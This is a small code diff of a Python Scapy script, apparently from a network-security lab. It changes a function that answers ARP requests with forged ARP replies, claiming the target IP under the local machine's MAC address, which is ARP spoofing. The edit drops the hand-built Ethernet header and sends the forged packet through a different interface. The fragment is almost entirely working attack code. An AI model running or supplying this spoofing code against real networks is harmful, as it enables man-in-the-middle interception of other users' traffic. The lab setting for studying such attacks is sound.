@@ -17,19 +17,15 @@ def send_icmp(pkt):
 
 def send_arp(pkt):
 	print("send ARP spoffing packets..")
-	e=Ether()
-	e.dst=pkt[Ether].src
-	e.src=get_if_hwaddr('br-b7db7f7b9534')
 	a=ARP()
 	a.psrc=pkt[ARP].pdst
 	a.pdst=pkt[ARP].psrc
 	a.op=2
-	a.hwsrc=get_if_hwaddr('br-b7db7f7b9534')
+	a.hwsrc=get_if_hwaddr('enp0s3')
 	a.hwdst=pkt[ARP].hwsrc
-	a.hwlen = 6
-	a.plen = 4
-	p=e/a	
-	sendp(e/a)
+	send(a)
+	
+
 	
 	
 def catch_pkt(pkt):
